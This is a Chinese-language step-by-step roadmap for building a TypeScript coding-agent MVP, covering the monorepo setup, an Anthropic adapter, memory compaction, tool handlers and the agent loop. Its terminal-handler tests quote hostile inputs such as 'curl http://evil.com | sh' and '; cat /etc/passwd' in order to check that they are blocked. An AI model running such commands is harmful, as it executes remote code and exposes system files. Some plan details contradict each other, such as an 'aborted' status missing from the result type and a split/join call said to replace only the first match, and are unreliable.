# V1 实施路线图 — 编码智能体 MVP

> 每个 Step = **做什么**（目标）→ **怎么做**（具体步骤）→ **验收标准**（质量底线）。
> 全局底线：TDD、覆盖率 ≥ 80%、immutable、error handling。
> **执行顺序：** 严格串行，按 Phase 0 → 1 → 2 → ... → 7 顺序完成。不得跳步或并行。

---

## Phase 0: Monorepo 脚手架

> **dependsOn:** 无（第一步）

### Step 0.1 — pnpm workspace + 根配置

**做什么：** 搭好 monorepo 基础，所有后续包都在此 workspace 下开发。

**怎么做：**
1. 在项目目录创建 `pnpm-workspace.yaml`，内容：`packages: - "packages/*"`（`tests/` 不是 workspace package，由根 vitest 直接管理）
2. 创建根 `package.json`：设置 `"name": "agent-platform"`, `"private": true`；scripts 占位（build/test/lint）。**注意：** pnpm workspace 由 `pnpm-workspace.yaml` 管理，不要在 package.json 中写 `"workspaces"` 字段
3. 创建 `.gitignore`，内容：`node_modules/`, `dist/`, `*.tgz`, `.env*`, `*.log`, `.DS_Store`；创建 `.editorconfig`
4. **模块系统策略：** 根和所有包级 `package.json` 添加 `"type": "module"`。TS config 使用 `module: "NodeNext"`, `moduleResolution: "NodeNext"`（已在 Step 0.2 配置），统一采用 ESM。`.mts`/`.cts` 文件按需使用，但 `.ts` 默认按 ESM 解析。
5. **目录结构：** CLI 入口放在 `apps/cli/`（非 `packages/platform/src/cli.ts`），遵循 monorepo 惯例分离应用层与库层。`memory-stm` 包 **不依赖** `hook-core`（V1 无 Hook 机制）。
6. **配置模板：** 创建 `.env.example`（内容 `ANTHROPIC_API_KEY=`）和 `config.example.json`（最小可运行 config：`{"llm":{"provider":"anthropic","apiKey":"your-key-here"},"agents":[...]}`），放入 monorepo 根目录供开发者参考。

**验收标准：**
- [ ] `pnpm install` 成功执行，无报错
- [ ] 根 scripts: build, test, lint 可执行（不报 command not found）

---

### Step 0.2 — TypeScript + ESLint + Prettier + esbuild

**做什么：** 配置 TS/ESLint/Prettier/esbuild，后续所有代码统一风格。

**怎么做：**
1. 创建 `tsconfig.base.json`：compilerOptions = { strict: true, target: "ES2022", module: "NodeNext", moduleResolution: "NodeNext", outDir: "dist", esModuleInterop: true }
2. 创建 `eslint.config.js`（flat config），使用 `@eslint/js` + `typescript-eslint`，启用 no-console、no-unused-vars、@typescript-eslint 基础规则；忽略 `dist/` 和 `node_modules/`
3. 创建 `.prettierrc`：singleQuote: true, semi: false, trailingComma: "all"
4. 为每个包创建 `tsconfig.json`（如 `packages/shared-types/tsconfig.json`），内容 `{ "extends": "../../tsconfig.base.json", "include": ["src"] }` — 使用 Project References，根目录运行 `tsc --build`
5. **构建脚本策略：** 安装 esbuild（devDep）：`pnpm add -D esbuild`。根 package.json scripts: `"build": "tsc --build && node build.mjs"`, `"test": "vitest run"`
6. 创建 `build.mjs`（ESM，在 monorepo 根目录）：
   ```js
   import { build } from 'esbuild';
   await build({
     entryPoints: ['apps/cli/src/index.ts'],
     bundle: true,
     platform: 'node',
     target: 'node20.0.0',
     outfile: 'apps/cli/dist/cli.js',
     external: [], // V1 无外部依赖；后续加 LLM SDK 时需加入 external
   });
   ```
7. 创建 `vitest.config.ts`：配置 coverage threshold（statements 80%, branches 80%, functions 80%, lines 80%），setupFiles 可放全局 mock。**必须添加 resolve.alias 将 `@agent-platform/*` 映射到各包 `src/index.ts`**，否则 root-level 的测试文件无法解析 workspace 包。所有后续 Step 的测试均基于此配置，无需在每个包中重复配置。

**验收标准：**
- [ ] 任意空 `.ts` 文件被 `tsc --noEmit` 编译通过
- [ ] 含类型错误的 `.ts` 文件（`const x: string = 123`）被 tsc 拒绝
- [ ] ESLint 对未使用变量报错
- [ ] `node build.mjs` 能成功打包 CLI 入口到 `apps/cli/dist/cli.js`

---

## Phase 1: shared-types (零依赖接口层)

> **dependsOn:** [Phase 0]
> 全局契约，后续所有包必须严格遵循。改接口 = 破坏性变更。

### Step 1.1 — ChatMessage / ToolCall / ToolResult / ToolDefinition

**做什么：** 定义 LLM 消息、工具调用、工具结果、工具声明的 interface。

**怎么做：**
1. 创建 `packages/shared-types/package.json`：`{"name": "@agent-platform/shared-types", "private": true, "types": "src/index.ts"}`
2. 新建 `packages/shared-types/src/chat.ts`，定义以下 interface：
   - `ChatMessage` — role ('system'|'user'|'assistant'|'tool'), content (string), toolCalls? (ToolCall[]), toolResults? (ToolResult[])
   - `ToolCall` — id (string, LLM 生成的调用 ID), name (string), arguments (unknown)
   - `ToolResult` — content (string), isError (boolean)
   - `ToolDefinition` — name (string), description (string), parameters (Record<string, unknown>, JSON Schema)
3. 在 `src/index.ts` 中 export 以上所有类型

**验收标准：**
- [ ] role、finishReason 等 union type 是字面量联合，不能传其他值（编译期检查）
- [ ] ToolCall.arguments 类型为 unknown（不是 any），下游必须显式 cast
- [ ] index.ts 能重新导出所有类型（`import type { ChatMessage } from '@agent-platform/shared-types'` 可用）
- [ ] 此文件不含任何 class/function，只有 interface/type

---

### Step 1.2 — LLM Response / Token Usage / AgentResult

**做什么：** 定义 LLM 响应、token 用量统计、Agent 执行结果的 interface。

**怎么做：**
1. 新建 `packages/shared-types/src/llm.ts`：
   - `ChatResponse` — message ({ role: 'assistant', content?, toolCalls? }), usage (TokenUsage), finishReason ('stop'|'tool_calls'|'length'|'content_filter')
   - `TokenUsage` — promptTokens (number), completionTokens (number), totalTokens (number)
   - `AgentResult` — status ('completed'|'max_iterations_reached'|'failed'), output? (string), agentId (string), error? (string)
2. 在 `index.ts` 中追加 export

**验收标准：**
- [ ] finishReason 四选一、status 三选一，编译期检查
- [ ] TokenUsage 不含厂商特有字段（如 cacheReadTokens），保持通用
- [ ] AgentResult.output 和 error 都是 optional

---

### Step 1.3 — Agent / ToolExecutionContext / ToolHandler interface

**做什么：** 定义 Agent（一等公民）、工具执行上下文、工具处理器接口的 interface。

**怎么做：**
1. 新建 `packages/shared-types/src/agent.ts`：
   - `ToolHandler` interface — id (string, readonly), getTools() → ToolDefinition[], execute(call: ToolCall, ctx: ToolExecutionContext) → Promise<ToolResult>
   - `Agent` interface — id (string, readonly), name (string, readonly), description (string), systemPrompt (string), model (string), temperature? (number), maxTokens? (number), **readonly** tools (ToolHandler[]) — 工具集只读，防止外部篡改 Agent 能力
   - `ToolExecutionContext` — sessionId (string), agentId (string), cwd (string), allowedPaths? (string[])
2. 在 `index.ts` 中追加 export

**验收标准：**
- [ ] Agent.id / name / **tools** 标记 readonly（外部不可修改）
- [ ] ToolExecutionContext.allowedPaths 是 optional（不是 required）
- [ ] **编译隔离测试**：新建一个独立 .ts 文件 import type，不安装任何其他包也能编译通过

---

### Step 1.4 — PlatformConfig（全局配置接口）

**做什么：** 定义所有可调参数的统一配置结构，放在 shared-types 中供全项目引用。

**怎么做：**
1. 新建 `packages/shared-types/src/config.ts`：
   - `LlmConfig` — provider ('anthropic'), apiKey (string), baseUrl? (默认 https://api.anthropic.com), timeoutMs? (默认 30000)
   - `AgentRuntimeParams` — model, temperature?, maxTokens?（与 Agent.systemPrompt 分离，便于热更新）
   - `AgentConfig` — id, name, description, systemPrompt（纯数据，不含 handler 引用）
   - `SecurityConfig` — allowedPaths?, terminalWhitelist?
   - `RuntimeConfig` — maxIterations?, stmThreshold?
   - `CliConfig` — prompt (REPL 提示符)
   - `PlatformConfig` — llm, agents(AgentConfig[]), runtime?, security?, cli?
   - `DEFAULT_CONFIG`, `DEFAULT_LLM`, `DEFAULT_AGENT_PARAMS` — 默认值常量
2. 在 `index.ts` 中追加 export

**验收标准：**
- [ ] AgentConfig 不含 handler 引用（纯 JSON 可序列化数据）
- [ ] PlatformConfig.llm.apiKey 为必填，baseUrl/timeoutMs 可选
- [ ] DEFAULT_CONFIG 覆盖所有可选字段

---

### Step 1.5 — Logger interface（极简日志）

**做什么：** 定义全局日志接口，所有包通过此接口记录日志，不直接调用 console。

**怎么做：**
1. 新建 `packages/shared-types/src/logger.ts`：
   - `Logger` interface — info, warn, error, debug 四个方法，meta 可选
   - `consoleLogger` 默认实现 — 输出到 process.stdout/stderr；debug() 仅在 `process.env.DEBUG === '1'` 时输出
2. 在 `index.ts` 中追加 export

**验收标准：**
- [ ] Logger interface 只有四个方法，无多余抽象
- [ ] debug() 默认不输出（受 DEBUG 环境变量控制）
- [ ] consoleLogger 是纯函数实现，无任何外部依赖

---

## Phase 2: Short-Term Memory (STM)

> **dependsOn:** [Phase 1]
> STM 是 Agent Loop 的上下文载体。compact() 的质量直接影响 LLM 对话质量。

### Step 2.1 — STM 核心：add / getContext

**做什么：** 实现 STM 的基础消息管理功能——追加和获取消息列表。

**怎么做：**
1. 创建 `packages/memory-stm/package.json`：`{"name": "@agent-platform/memory-stm", "types": "src/index.ts"}`，依赖 shared-types
2. 新建 `packages/memory-stm/src/ShortTermMemory.ts`：
   - class ShortTermMemory { private messages: ChatMessage[] = [] }
   - `add(message: ChatMessage)` — 内部做 structuredClone(message) 后再 push（immutable）
   - `getContext(): ChatMessage[]` — 返回 [...this.messages] 快照（不返回内部引用）
3. 新建 `packages/memory-stm/src/index.ts` — export { ShortTermMemory }

**测试怎么写：**
- [ ] test "add appends message to internal storage" — add 后 getContext().length === 1
- [ ] test "getContext returns a snapshot, not internal reference" — 对返回值调用 .push()，内部长度不变
- [ ] test "empty STM getContext returns []"
- [ ] test "add beyond capacity wraps oldest messages" — 设 maxCapacity=5，add 7 条后 getContext().length === 5，内容为最后 add 的 5 条（不是前 5 条）
- [ ] test "getContext respects maxCapacity" — 同上加断言内部数组长度

**验收标准：**
- [ ] add() 不 mutate 传入的 message（structuredClone）
- [ ] getContext() 返回数组快照，外部修改不影响内部状态
- [ ] 空 STM getContext() 返回 [] 不抛错
- [ ] 连续 add 100 条后 length === 100

---

### Step 2.2 — STM compact(): 旧消息压缩为摘要（保留角色分类）

**做什么：** 当消息过多时，将最旧的 N 轮对话合并为按角色分组的系统摘要，释放上下文空间。摘要保留 role 分类（User/Assistant/Tool），让 LLM 在压缩后仍能区分哪些是用户说的、哪些是助手回的、哪些是工具结果。

**怎么做：**
1. 在 `ShortTermMemory.ts` 中添加：
   - private threshold: number = 50（可配置）
   - `compact(): number` — 如果 messages.length <= threshold，返回 0；否则取最旧的 N = floor(threshold / 2) = 25 条消息，按 role 分类后拼接为一段摘要文本，插入到 messages 开头作为一条 `{ role: 'system', content: '[对话摘要]' }`，然后删除被压缩的旧消息。
   - **摘要格式（按角色分组）：**
     ```
     [User Messages]
     - "帮我实现一个快速排序函数"

     [Assistant Messages]
     - "好的，我来实现快速排序..."

     [Tool Results]
     - write_file(quickSort.ts): success
     - git_diff: 1 file changed, 20 insertions

     [对话摘要：共 N 轮对话，核心目标是实现快速排序...]
     ```
   - **算法细节：**
     - 每组最多保留 10 条消息（`slice(0, 10)`）
     - 每条消息内容截断至前 200 字符（`substring(0, 200)`）
     - tool 角色消息：若 content 含 JSON，仅提取外层 key 信息（如 `"write_file(quickSort.ts): success"`），否则取 content 前 200 字符
     - `[对话摘要]` 行从第一条 user message 提取前 100 字符作为核心目标
   - 返回被释放的 token **估算值**（UTF-8 字节数 / 3）— V1 不做精确 token 计数，此估算值仅用于预算判断
2. 在 `index.ts` 中确认导出

**测试怎么写：**
- [ ] test "compact returns 0 when below threshold" — 30 条消息 < 阈值 50，compact() → 0
- [ ] test "compact compresses oldest messages into a role-grouped summary" — 60 条消息 > 阈值，compact() 后 length < 60，摘要中包含 `[User Messages]`、`[Assistant Messages]`、`[Tool Results]` 分组标记
- [ ] test "compact preserves user/assistant/tool distinction in summary" — 验证摘要中各角色分类正确（user 消息在 User 组，tool 结果在 Tool Results 组）
- [ ] test "compact returns token count estimate (UTF-8 bytes / 3)" — 返回值 ≈ new TextEncoder().encode(removedContent).length / 3（取整）
- [ ] test "consecutive compact calls return 0 after first compression"

**验收标准：**
- [ ] ≤ 50 条消息时 compact() 返回 0，不修改任何消息
- [ ] > 50 条时 compact() 用一条 system 摘要替换最旧的 N 条
- [ ] 摘要有清晰的角色分组标记（User/Assistant/Tool），不是盲拼所有 content
- [ ] compact 后消息总数 < compact 前
- [ ] compact() 连续调用两次，第二次返回 0

---

## Phase 3: LLM Adapter (Anthropic Claude)

> **dependsOn:** [Phase 1]
> ClaudeAdapter 是 ChatMessage ↔ Anthropic API 的唯一翻译层。后续新增 OpenAI adapter 时不能改此 interface。

### Step 3.1 — ClaudeAdapter.complete() 非流式调用

**做什么：** 实现 Anthropic Messages API 的完整调用链路——消息转换 → HTTP 请求 → 响应解析。

**怎么做：**
1. 创建 `packages/llm-adapter/package.json`：依赖 shared-types，runtime 依赖 node-fetch 或 undici（fetch）
2. 新建 `packages/llm-adapter/src/ClaudeAdapter.ts`：
   - class ClaudeAdapter { private apiKey: string; baseUrl: string; timeoutMs: number; fetchFn: typeof fetch }
   - constructor(config: LlmConfig, options?: { fetchFn?: typeof fetch }) — 从 LlmConfig 构造：apiKey, baseUrl (默认 https://api.anthropic.com), timeoutMs (默认 30000)；fetchFn 默认为全局 `fetch`（测试时可注入 mock）
   - `complete(messages: ChatMessage[], tools?: ToolDefinition[]): Promise<ChatResponse>`：
     a. 将 messages 拆分为 system prompt（role='system' 的单独提取）和 user/assistant/tool messages
     b. 将 tools 转换为 Anthropic tool format（name, description, input_schema 用 JSON Schema）
     c. `this.fetchFn(url, { method: 'POST', headers: { 'x-api-key': this.apiKey, 'anthropic-version': '2023-06-01', 'content-type': 'application/json' }, body: JSON.stringify(body) })` — **必须包含** `anthropic-version` header（固定值 `'2023-06-01'`），否则 API 返回 400。使用注入的 fetchFn 而非全局 fetch
     d. 解析 response：content[0].text → message.content；usage.input_tokens → promptTokens；stop_reason 映射为 finishReason
3. `src/index.ts` — export { ClaudeAdapter, LLMAdapter }（定义 LLMAdapter interface，ClaudeAdapter implements it）

**测试怎么写：**
- [ ] test "system messages go to system param, not messages array" — Mock fetch，验证请求 body 中 system prompt 在顶层 system 字段
- [ ] test "tools are converted to Anthropic format with JSON Schema input_schema"
- [ ] test "response is parsed correctly: text content, token usage, finish reason"

**验收标准：**
- [ ] ChatMessage.system → Anthropic API 的 system parameter（不是 messages 数组中）
- [ ] ToolDefinition.parameters 以 JSON Schema 格式传入 input_schema
- [ ] response.stop_reason 'end_turn' → 'stop'，'tool_use' → 'tool_calls'
- [ ] TokenUsage.input_tokens → promptTokens，output_tokens → completionTokens

---

**V2 Consideration: Streaming (`stream()`)** — ClaudeAdapter 的 injectable `fetchFn` 和 decoupled response parsing 已为 V2 添加 `stream()` 预留了条件。V2 实现时只需在 complete() 外再包装一层流式解析器（累积 `StreamChunk` → 生成完整 `ChatResponse`），不改核心接口。

### Step 3.2 — ClaudeAdapter 错误处理

**做什么：** 覆盖 Anthropic API 所有常见错误的 graceful handling。

**怎么做：**
1. 在 `ClaudeAdapter.ts` 的 complete() 方法中，try/catch fetch 调用：
   - Response.ok === false → 解析 error body（{ error: { type, message } }）→ throw new Error(`Anthropic API error (${response.status}): ${error.message}`)
   - Network error / timeout → catch → throw new Error(`Anthropic API call failed: ${(e as Error).message}`)
2. 添加 timeout：使用 AbortController，30s 超时
3. **重试逻辑**（仅对 transient 错误）：在 complete() 外层包裹 retry 循环：
   - `maxRetries = 2`；仅对以下状态码/错误重试：429 (rate limit)、502、503、timeout
   - 不对 400/401/403/404 重试（这些是客户端错误，重试无意义）
   - 退避策略: `Math.min(1000 * 2^attempt, 5000)` ms（即 1s → 2s → max 5s）

**测试怎么写：**
- [ ] test "400 returns error with code and message" — Mock fetch 返回 400 + error body，不重试
- [ ] test "401/403 indicates auth problem clearly" — Error message 含 "API key"，不重试
- [ ] test "429 triggers retry then fails after maxRetries" — Mock fetch 连续返回 429，验证重试 2 次后抛出错误
- [ ] test "502/503 triggers retry with exponential backoff" — Mock fetch 先失败再成功，验证最终返回正确结果
- [ ] test "network timeout triggers retry" — Mock fetch 超时两次后再成功
- [ ] test "success on first try skips retry" — Mock fetch 直接返回 200

**验收标准：**
- [ ] 每种 HTTP 错误码的 Error.message 包含关键信息（code / auth / rate limit）
- [ ] Network timeout → Error.message 含 "timeout"
- [ ] 429/502/503/timeout 触发重试，最多 2 次；400/401/403 不重试
- [ ] 所有错误路径都有测试覆盖

---

## Phase 4: Tool Handlers (工具处理器)

> **dependsOn:** [Phase 1, Phase 2]
> 每个 Handler 实现 ToolHandler interface。execute() 是副作用操作，必须有完善的错误处理和安全性校验。

### Step 4.1 — Filesystem Handler: read_file / list_dir / grep

**做什么：** 实现文件读取、目录列表、正则搜索（单文件 + 递归目录）四个基础工具。

**怎么做：**
1. 创建 `packages/tools/filesystem/package.json`：依赖 shared-types，使用 Node.js fs/promises + fs/stat
2. 新建 `packages/tools/filesystem/src/FilesystemHandler.ts`：
   - class FilesystemHandler implements ToolHandler { id = 'filesystem'; getTools(); execute(call, ctx) }
   - getTools() → [read_file_def, list_dir_def, grep_def, grep_r_def]，每个定义包含 name、description、parameters(JSON Schema)
   - execute(call, ctx): 根据 call.name 分发：
     - `read_file({ path })` — fs.readFile(path, 'utf-8')，捕获 ENOENT → { content: "ENOENT: no such file...", isError: true }
     - `list_dir({ path })` — fs.readdir(path, { withFileTypes: true }) → [{ name, type: 'file'|'directory' }]，JSON.stringify 后返回
     - `grep({ pattern, path })` — fs.readFile + splitLines + filter(line => regex.test(line)) → [{ line, content }] — 仅搜索单个文件
     - `grep_r({ pattern, path })` — 递归目录搜索：fs.readdir 遍历子目录，对每个 `.ts/.js/.tsx/.jsx/.mjs/.cjs` 文件执行 grep。返回格式为 `[{"file": "path/to/file", "line": N, "content": "..."}]`。限制单次最多返回 200 条匹配（超限截断 + "[truncated]"）
3. `src/index.ts` — export { FilesystemHandler }

**测试怎么写：**
- [ ] test "read_file returns file content as UTF-8 string" — 创建临时文件，写入文本，read_file 后断言内容匹配
- [ ] test "read_file for non-existent path returns isError: true"
- [ ] test "list_dir returns files and directories with correct types" — 创建混合目录结构验证
- [ ] test "grep finds matching lines with line numbers in single file" — 创建含多行的文件，grep 特定 pattern
- [ ] test "grep_r searches recursively across subdirectories" — 创建嵌套目录 + 匹配文件，验证 grep_r 返回所有子目录中的匹配
- [ ] test "grep_r truncates at 200 results with marker"

**验收标准：**
- [ ] read_file 对不存在路径返回 { isError: true }（不抛未捕获异常）
- [ ] list_dir 返回的对象有 name 和 type ('file'|'directory')
- [ ] grep 的 pattern 按正则表达式处理（不是字面量匹配）
- [ ] grep_r 递归搜索子目录，仅扫描常见代码文件扩展名
- [ ] grep_r 超过 200 条结果时截断并附加 "[truncated]" 标记

---

### Step 4.2 — Filesystem Handler: write_file / edit_file

**做什么：** 实现文件写入和内容编辑工具。edit_file 支持字面量匹配和 regex 模式两种匹配方式。

**怎么做：**
1. 在 `FilesystemHandler.ts` 中追加两个 ToolDefinition + execute 分支：
   - `write_file({ path, content })` — fs.writeFileSync(path, content)，捕获错误 → { isError: true }
   - `edit_file({ path, old_string, new_string, regex? })` — 读取文件内容后编辑并写回。
     - **字面量模式（默认）**：用 `content.split(old_string).join(new_string)` 替换第一次出现。如果 old_string 不存在 → { content: "old_string not found", isError: true }
     - **regex 模式**（`regex=true`）：用 `new RegExp(old_string)` 编译正则，执行 `content.replace(new RegExp(old_string), new_string)`。编译失败 → { content: "Invalid regex pattern: ...", isError: true }；匹配不到 → { content: "No match found for regex", isError: true }
2. execute() 开头可加 allowedPaths 校验作为可选加固（主防线在 ToolRegistry.execute 中已做）：遍历 arguments 中的路径字段，path.resolve + startsWith，越权 → { content: "Access denied", isError: true }

**测试怎么写：**
- [ ] test "write_file creates new file with correct content" — 写临时文件后 fs.existsSync + fs.readFileSync 验证
- [ ] test "write_file overwrites existing file (not append)" — 先写 "old"，再写 "new"，断言内容为 "new"（不是 "oldnew"）
- [ ] test "edit_file replaces old_string with new_string (literal mode)" — 写入含关键词的文件，edit 后验证替换结果
- [ ] test "edit_file returns isError when old_string not found (literal mode)"
- [ ] test "edit_file works with regex pattern (regex=true)" — 用正则匹配变体文本并替换
- [ ] test "edit_file returns isError for invalid regex" — 传入非法正则表达式，验证错误信息含 "Invalid regex"
- [ ] test "write_file outside allowedPaths returns Access denied"

**验收标准：**
- [ ] write_file 覆盖时是替换（不是追加）
- [ ] edit_file 字面量模式找不到旧文本返回 isError: true
- [ ] edit_file regex=true 时使用正则匹配，regex=false/undefined 时使用字面量匹配
- [ ] allowedPaths 校验生效：越权路径返回 Access denied

---

### Step 4.3 — Git Handler: git_diff / git_status

**做什么：** 实现 git diff 和 git status 两个工具。

**怎么做：**
1. 创建 `packages/tools/git/package.json`：依赖 shared-types，使用 child_process.execFile（不是 exec，更安全）
2. 新建 `packages/tools/git/src/GitHandler.ts`：
   - class GitHandler implements ToolHandler { id = 'git'; getTools(); execute(call, ctx) }
   - `git_diff()` — 先执行 `git diff --cached`（暂存区），再执行 `git diff`（工作区），合并输出。无变更时返回 "No changes"
   - `git_status()` — 执行 `git status -sb`（短格式 + 分支信息）
   - execute(call, ctx): **先校验** `path.isAbsolute(ctx.cwd)`，不通过则返回 `{ content: 'Invalid working directory', isError: true }`；通过后以 `path.resolve(ctx.cwd)` 作为 execFile 的 cwd 选项，超时 10s
3. `src/index.ts` — export { GitHandler }

**测试怎么写：**
- [ ] test "git_diff returns 'No changes' when no diffs" — Mock child_process.execFile
- [ ] test "git_status runs in correct working directory" — 验证 execFile cwd 选项设为 ctx.cwd
- [ ] test "execFile respects 10s timeout on slow git operations" — Mock execFile 延迟超过 10s，验证超时被正确触发
- [ ] test "non-absolute cwd returns isError: true" — 传入相对路径，应拒绝

**验收标准：**
- [ ] git_diff 无变更时返回 "No changes"（不是空字符串）
- [ ] git_status 使用 -sb 短格式
- [ ] execFile 超时 ≥ 10s，cwd 使用 ctx.cwd
- [ ] cwd 非绝对路径 → { isError: true }

---

### Step 4.4 — Terminal Handler: exec_command (白名单)

**做什么：** 实现安全的 shell 命令执行工具——白名单 + 注入拦截。V1 默认包含 Coding Agent 常用命令（文件操作、构建工具等）。

**怎么做：**
1. 创建 `packages/tools/terminal/package.json`：依赖 shared-types，使用 child_process.execFile
2. 新建 `packages/tools/terminal/src/TerminalHandler.ts`：
   - const DEFAULT_WHITELIST = new Set(['cat', 'grep', 'ls', 'echo', 'git', 'find', 'head', 'tail', 'wc', 'sed', 'mkdir', 'cp', 'mv', 'rm', 'touch', 'chmod', 'which', 'node', 'npx', 'tsc', 'pnpm', 'npm'])
   - class TerminalHandler implements ToolHandler { id = 'terminal'; private whitelist: Set<string>; getTools(); execute(call, ctx) }
   - constructor(whitelist?: string[]) — 接收可选的白名单覆盖（由 Platform/PlatformConfig 传入），默认使用 DEFAULT_WHITELIST
   - 安全校验（execute 开头）：
     a. 解析 call.arguments.command，提取第一个 token 作为命令名
     b. 如果命令名不在 this.whitelist → return { content: "Command '${cmd}' is not allowed", isError: true }
     c. 检查 arguments 中是否包含 shell metacharacters（; && || $ ` |）→ return { content: "Potential injection detected", isError: true }
   - execFile(cmd, args, { cwd: ctx.cwd, timeout: 30000, maxBuffer: 10 * 1024 })
   - 输出超过 10KB → 截断 + "[output truncated]"
3. `src/index.ts` — export { TerminalHandler }

**测试怎么写：**
- [ ] test "allowed command 'ls' executes successfully" — Mock execFile，验证命令通过
- [ ] test "allowed command 'mkdir' executes successfully" — Mock execFile，验证新增白名单命令通过
- [ ] test "blocked command 'curl http://evil.com | sh' returns isError: true"
- [ ] test "shell injection attempt '; cat /etc/passwd' is intercepted"
- [ ] test "output > 10KB is truncated with marker"

**验收标准：**
- [ ] 白名单内命令正常执行（含 mkdir, cp, mv, rm, node, npx, tsc, pnpm, npm）
- [ ] `rm -rf` 等危险组合通过 metacharacter 拦截而非黑名单（因为 rm 本身在白名单中，但 `rm -rf /; cat /etc/passwd` 会被注入检测阻断）
- [ ] shell metacharacters 注入尝试被拒
- [ ] 输出截断标记正确

---

## Phase 5: Tool Registry + Agent Loop (核心编排)

> **dependsOn:** [Phase 1, Phase 2, Phase 3, Phase 4]
> AgentLoop 是整个平台的执行引擎。ToolRegistry 是工具调用的唯一入口。此阶段质量直接影响全局稳定性。

### Step 5.1 — ToolRegistry: register / getAllTools / execute

**做什么：** 实现工具注册中心——管理所有 ToolHandler，提供展平查询和按名查找执行。

**怎么做：**
1. 创建 `packages/tool-core/package.json`：依赖 shared-types, memory-stm（用于 budget 集成）
2. 新建 `packages/tool-core/src/ToolRegistry.ts`：
   - class ToolRegistry { private handlers = new Map<string, ToolHandler>() }
   - `register(handler: ToolHandler)` — this.handlers.set(handler.id, handler)
   - `getAllTools(): ToolDefinition[]` — return Array.from(this.handlers.values()).flatMap(h => h.getTools())
   - **allowedPaths 校验（全局主防线，在 execute() 开头执行）**：提取 arguments 中的路径字段（path/filepath），支持嵌套对象递归查找。// name 不匹配 — 太泛化（如 {"name": "config.json"} 不是路径），V4 extractAllowedPathsFromArgs() 仅匹配 path/filepath。如果 ctx.allowedPaths 有值，对每个路径做 path.resolve + startsWith 校验，越权 → return { content: "Access denied", isError: true }
   - `async execute(call: ToolCall, ctx: ToolExecutionContext): Promise<ToolResult>`：
     a. handler = this.handlers.get(call.name)，找不到 → { content: `Unknown tool: ${call.name}`, isError: true }
     b. result = await handler.execute(call, ctx)；catch → { content: `Tool error: ${(e as Error).message}`, isError: true }
3. `src/index.ts` — export { ToolRegistry }

**测试怎么写：**
- [ ] test "register then getAllTools reflects new tool immediately"
- [ ] test "execute calls correct handler and returns its result"
- [ ] test "execute for unknown toolId returns isError: true with 'Unknown tool' message"
- [ ] test "allowedPaths blocks write outside allowed directory"

**验收标准：**
- [ ] register 后 getAllTools 立即反映（无缓存）
- [ ] 未知工具返回 { isError: true }，不抛错
- [ ] allowedPaths 校验生效：越权路径返回 Access denied
- [ ] 路径提取支持嵌套对象中的 path/filepath/name

---

### Step 5.2 — runAgentLoop: 核心循环（含 AbortSignal 支持）

**做什么：** 实现 Agent Loop——LLM ↔ Tool 迭代，直到 LLM 只返回文本、达到最大迭代次数或收到中止信号。

**怎么做：**
1. 新建 `packages/tool-core/src/runAgentLoop.ts`：
    - interface AgentLoopConfig = `{ agent, messages, registry, ctx, llm, memory?, maxIterations?, compressionRatio?, signal? }`（定义见 architecture-v1.md §3.4），`signal?: AbortSignal` 用于外部中断（如 Ctrl-C）；`compressionRatio` 从 PlatformConfig.runtime 传入，用于计算 token 预算
   - async function runAgentLoop(config: AgentLoopConfig): Promise<AgentResult>
   - while (iteration < config.maxIterations ?? 20) {
     a. **每次迭代开始时检查** `config.signal?.aborted` → true 则 return { status: 'aborted', agentId: config.agent.id }
     b. systemPrompt = config.agent.systemPrompt；restMessages = config.messages（不含 system 角色）；response = await config.llm.complete(restMessages, tools) — **注意：** system prompt 作为独立参数传给 LLM Adapter，不在 messages 数组中。ClaudeAdapter.complete() 内部将 systemPrompt 映射为 Anthropic API 的 `system` 参数（见 Step 3.1 实现细节）
     c. if response.message.toolCalls && response.message.toolCalls.length > 0：遍历每个 call → `await config.registry.execute(call, config.ctx)` → result push to messages（每条作为 `{ role: 'tool', content: result.content, isError: result.isError }`）→ iteration++ → continue
     d. else（纯文本响应）：return { status: 'completed', output: response.message.content, agentId: config.agent.id }
   - return { status: 'max_iterations_reached', agentId: config.agent.id }

**测试怎么写：**
- [ ] test "LLM returns tool_calls → execute tools via registry → continue loop" — Mock LLM 先返回 tool_call，再返回 text，验证循环执行了两次
- [ ] test "LLM returns only text → immediate completion" — Mock LLM 只返回文本（无 toolCalls），断言 status='completed'
- [ ] test "exceeds maxIterations → 'max_iterations_reached'" — Mock LLM 持续返回 tool_calls，迭代次数超限后断言 status
- [ ] test "signal.aborted → 'aborted'" — 在循环开始前 abort signal，验证立即返回 aborted

**验收标准：**
- [ ] toolCalls → 执行工具 → 结果追加 messages → continue
- [ ] 无 toolCalls → return { completed, output }
- [ ] maxIterations=3，持续 tool_call → 第 4 次返回 'max_iterations_reached'
- [ ] LLM 抛错 → catch → { status: 'failed', error: "LLM API call failed: ..." }
- [ ] signal.aborted → return { status: 'aborted', agentId }（不抛错）

---

### Step 5.3 — runAgentLoop: Token 预算 + STM compact() 集成（必选）

> **为什么是必选：** Agent Loop 不追踪 token 用量会导致 LLM 对话无限膨胀，消耗大量费用。V1 必须通过 budget + compact 控制上下文窗口使用。

**做什么：** 在 Agent Loop 中累计 token 用量，超限触发 STM compact()。

**怎么做：**
1. 修改 `runAgentLoop.ts`（在 Step 5.2 基础上追加 token 计数逻辑）：
   - config 已包含 memory?: ShortTermMemory（见 AgentLoopConfig），无需新增
   - let totalTokens = 0；let consecutiveCompactFailures = 0
    - budget = Math.floor((config.agent.contextWindow ?? 200000) * (config.compressionRatio ?? 0.8))
   - **前置守卫：** 如果 `config.memory` 为 undefined，跳过整个 token 预算逻辑（不检查、不调用 compact），直接 `iteration++` → continue。防止 memory 未注入时 budget 检查 crash
   - 每次迭代后：totalTokens += response.usage.totalTokens；if (totalTokens > budget * 1.5 && consecutiveCompactFailures >= 3) → break（硬上限保护，防止 LLM 响应过大时预算失控）；else if (totalTokens > budget) → freed = config.memory.compact()；if (freed > 0) { totalTokens -= freed; consecutiveCompactFailures = 0 } else consecutiveCompactFailures++（≥3 break）
2. 确认 index.ts 导出

**测试怎么写：**
- [ ] test "compact triggers when totalTokens exceeds budget" — Mock LLM 返回大用量，验证 compact() 被调用
- [ ] test "compact returns > 0 → totalTokens reduced, loop continues"
- [ ] test "compact returns 0 for 3 consecutive calls → break"

**验收标准：**
- [ ] budget = (agent.contextWindow ?? 200000) * (compressionRatio ?? 0.8)
- [ ] totalTokens 从第一次迭代开始累计，跨轮正确累加
- [ ] compact() > 0 → 释放后继续循环
- [ ] compact() 连续 3 次返回 0 → break（不无限循环）

---

## Phase 6: Platform Assembly + CLI Entry

> **dependsOn:** [Phase 1, Phase 2, Phase 3, Phase 4, Phase 5]
